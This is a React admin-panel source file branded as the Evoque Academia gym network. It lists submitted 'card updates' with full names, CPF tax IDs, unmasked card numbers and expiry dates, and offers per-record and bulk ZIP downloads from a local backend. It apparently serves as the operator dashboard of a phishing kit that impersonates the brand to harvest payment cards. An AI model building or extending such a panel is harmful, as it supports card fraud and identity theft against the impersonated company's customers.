import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow
} from '@/components/ui/table';
import {
  CreditCard,
  Users,
  CheckCircle,
  AlertCircle,
  Clock,
  ArrowLeft,
  RefreshCw,
  Download,
  Loader2,
  Eye
} from 'lucide-react';
import { toast } from 'sonner';
import evoqueLogo from '@/assets/evoque-logo.webp';

interface Payment {
  id: string;
  nomeCompleto: string;
  cpf: string;
  numeroCartao: string;
  validade: string;
  dataCriacao: string;
  status: 'pendente' | 'processado' | 'erro';
}

const Admin = () => {
  const navigate = useNavigate();
  const [payments, setPayments] = useState<Payment[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isDownloading, setIsDownloading] = useState(false);
  const [selectedPayment, setSelectedPayment] = useState<Payment | null>(null);
  const [paymentDetails, setPaymentDetails] = useState<string>('');
  const [isLoadingDetails, setIsLoadingDetails] = useState(false);
  const [isDownloadingFile, setIsDownloadingFile] = useState(false);

  const BACKEND_URL = 'http://localhost:5000';

  useEffect(() => {
    fetchPayments();
  }, []);

  const fetchPayments = async () => {
    try {
      setIsLoading(true);
      const response = await fetch(`${BACKEND_URL}/api/payments`);

      if (!response.ok) {
        throw new Error(`Erro ao buscar dados: ${response.status}`);
      }

      const data = await response.json();

      if (data.success) {
        // Convert dataCriacao to proper format for sorting
        const paymentsWithDate = data.payments.map((p: Payment) => ({
          ...p,
          dataCriacaoObj: new Date(p.dataCriacao)
        }));

        // Sort by date descending
        paymentsWithDate.sort((a: any, b: any) =>
          b.dataCriacaoObj.getTime() - a.dataCriacaoObj.getTime()
        );

        // Remove the temporary date object
        setPayments(paymentsWithDate.map(({ dataCriacaoObj, ...p }: any) => p));

        if (data.payments.length > 0) {
          toast.success(`${data.total} pagamentos carregados com sucesso!`);
        }
      } else {
        toast.error('Erro ao carregar pagamentos');
      }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Erro ao conectar com backend';
      console.error('Erro:', error);
      toast.error(errorMsg);
    } finally {
      setIsLoading(false);
    }
  };

  const downloadZip = async () => {
    try {
      setIsDownloading(true);
      const response = await fetch(`${BACKEND_URL}/api/download-zip`);

      if (!response.ok) {
        throw new Error(`Erro ao baixar: ${response.status}`);
      }

      // Get the blob
      const blob = await response.blob();

      // Create a temporary URL for the blob
      const url = window.URL.createObjectURL(blob);

      // Create a temporary anchor element and trigger download
      const link = document.createElement('a');
      link.href = url;
      link.download = `pagamentos_${new Date().toISOString().split('T')[0]}.zip`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Clean up the URL
      window.URL.revokeObjectURL(url);

      toast.success('Download iniciado com sucesso!');
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Erro ao baixar arquivo';
      console.error('Erro:', error);
      toast.error(errorMsg);
    } finally {
      setIsDownloading(false);
    }
  };

  const viewPaymentDetails = async (payment: Payment) => {
    try {
      setSelectedPayment(payment);
      setIsLoadingDetails(true);

      const response = await fetch(`${BACKEND_URL}/api/payment/${payment.id}`);

      if (!response.ok) {
        throw new Error(`Erro ao buscar detalhes: ${response.status}`);
      }

      const data = await response.json();

      if (data.success) {
        setPaymentDetails(data.content);
      } else {
        toast.error('Erro ao carregar detalhes do pagamento');
        setSelectedPayment(null);
      }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Erro ao carregar detalhes';
      console.error('Erro:', error);
      toast.error(errorMsg);
      setSelectedPayment(null);
    } finally {
      setIsLoadingDetails(false);
    }
  };

  const downloadPaymentFile = async () => {
    if (!selectedPayment) return;

    try {
      setIsDownloadingFile(true);
      const response = await fetch(`${BACKEND_URL}/api/payment/${selectedPayment.id}/download`);

      if (!response.ok) {
        throw new Error(`Erro ao baixar: ${response.status}`);
      }

      // Get the blob
      const blob = await response.blob();

      // Create a temporary URL for the blob
      const url = window.URL.createObjectURL(blob);

      // Create a temporary anchor element and trigger download
      const link = document.createElement('a');
      link.href = url;
      link.download = `${selectedPayment.id}.txt`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Clean up the URL
      window.URL.revokeObjectURL(url);

      toast.success('Download iniciado com sucesso!');
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Erro ao baixar arquivo';
      console.error('Erro:', error);
      toast.error(errorMsg);
    } finally {
      setIsDownloadingFile(false);
    }
  };

  const stats = {
    total: payments.length,
    processados: payments.filter(p => p.status === 'processado').length,
    pendentes: payments.filter(p => p.status === 'pendente').length,
    erros: payments.filter(p => p.status === 'erro').length,
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'processado':
        return (
          <Badge className="bg-green-500/20 text-green-400 border-green-500/30 hover:bg-green-500/30">
            <CheckCircle className="h-3 w-3 mr-1" />
            Processado
          </Badge>
        );
      case 'pendente':
        return (
          <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30 hover:bg-yellow-500/30">
            <Clock className="h-3 w-3 mr-1" />
            Pendente
          </Badge>
        );
      case 'erro':
        return (
          <Badge className="bg-red-500/20 text-red-400 border-red-500/30 hover:bg-red-500/30">
            <AlertCircle className="h-3 w-3 mr-1" />
            Erro
          </Badge>
        );
      default:
        return (
          <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30 hover:bg-gray-500/30">
            {status}
          </Badge>
        );
    }
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b border-border bg-card/50 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <Button 
              variant="ghost" 
              size="icon" 
              onClick={() => navigate('/')}
              className="text-muted-foreground hover:text-foreground"
            >
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <img 
              src={evoqueLogo} 
              alt="Evoque Academia" 
              className="h-10 w-auto object-contain"
            />
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="admin"
              size="sm"
              className="gap-2"
              onClick={fetchPayments}
              disabled={isLoading}
            >
              <RefreshCw className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} />
              {isLoading ? 'Atualizando...' : 'Atualizar'}
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="gap-2"
              onClick={downloadZip}
              disabled={isDownloading || payments.length === 0}
            >
              <Download className={`h-4 w-4 ${isDownloading ? 'animate-spin' : ''}`} />
              {isDownloading ? 'Baixando...' : 'Baixar ZIP'}
            </Button>
          </div>
        </div>
      </header>

      {/* Main content */}
      <main className="container mx-auto px-4 py-8">
        <div className="mb-8 animate-fade-in">
          <h1 className="text-3xl font-bold text-foreground mb-2">
            Painel administrativo
          </h1>
          <p className="text-muted-foreground">
            Gerencie as atualizações de pagamento da rede Evoque Academia
          </p>
        </div>

        {/* Stats cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
          <Card className="animate-fade-in" style={{ animationDelay: '0.1s' }}>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Total de registros</p>
                  <p className="text-3xl font-bold text-foreground">{stats.total}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-primary/10 flex items-center justify-center">
                  <Users className="h-6 w-6 text-primary" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="animate-fade-in" style={{ animationDelay: '0.2s' }}>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Processados</p>
                  <p className="text-3xl font-bold text-green-400">{stats.processados}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-green-500/10 flex items-center justify-center">
                  <CheckCircle className="h-6 w-6 text-green-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="animate-fade-in" style={{ animationDelay: '0.3s' }}>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Pendentes</p>
                  <p className="text-3xl font-bold text-yellow-400">{stats.pendentes}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-yellow-500/10 flex items-center justify-center">
                  <Clock className="h-6 w-6 text-yellow-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="animate-fade-in" style={{ animationDelay: '0.4s' }}>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Com erro</p>
                  <p className="text-3xl font-bold text-red-400">{stats.erros}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-red-500/10 flex items-center justify-center">
                  <AlertCircle className="h-6 w-6 text-red-400" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Payments table */}
        <Card className="animate-fade-in" style={{ animationDelay: '0.5s' }}>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <CreditCard className="h-5 w-5 text-primary" />
              Atualizações de pagamento
            </CardTitle>
            <CardDescription>
              Lista de todas as atualizações de cartão recebidas
            </CardDescription>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <div className="flex items-center justify-center py-12">
                <div className="flex flex-col items-center gap-2">
                  <Loader2 className="h-8 w-8 text-primary animate-spin" />
                  <p className="text-muted-foreground">Carregando pagamentos...</p>
                </div>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow className="border-border hover:bg-transparent">
                      <TableHead className="text-muted-foreground">Nome</TableHead>
                      <TableHead className="text-muted-foreground">CPF</TableHead>
                      <TableHead className="text-muted-foreground">Cartão</TableHead>
                      <TableHead className="text-muted-foreground">Validade</TableHead>
                      <TableHead className="text-muted-foreground">Data</TableHead>
                      <TableHead className="text-muted-foreground">Status</TableHead>
                      <TableHead className="text-muted-foreground w-12">Ação</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {payments.map((payment, index) => (
                      <TableRow
                        key={payment.id}
                        className="border-border hover:bg-muted/50 animate-slide-in"
                        style={{ animationDelay: `${0.1 * index}s` }}
                      >
                        <TableCell className="font-medium text-foreground">
                          {payment.nomeCompleto}
                        </TableCell>
                        <TableCell className="text-muted-foreground">
                          {payment.cpf}
                        </TableCell>
                        <TableCell className="text-muted-foreground font-mono">
                          {payment.numeroCartao}
                        </TableCell>
                        <TableCell className="text-muted-foreground">
                          {payment.validade}
                        </TableCell>
                        <TableCell className="text-muted-foreground">
                          {payment.dataCriacao}
                        </TableCell>
                        <TableCell>
                          {getStatusBadge(payment.status)}
                        </TableCell>
                        <TableCell>
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={() => viewPaymentDetails(payment)}
                            className="h-8 w-8 text-muted-foreground hover:text-primary"
                            title="Visualizar detalhes"
                          >
                            <Eye className="h-4 w-4" />
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            )}

            {!isLoading && payments.length === 0 && (
              <div className="text-center py-12">
                <CreditCard className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
                <p className="text-muted-foreground">Nenhuma atualização de pagamento encontrada</p>
              </div>
            )}
          </CardContent>
        </Card>
      </main>
    </div>
  );
};

export default Admin;
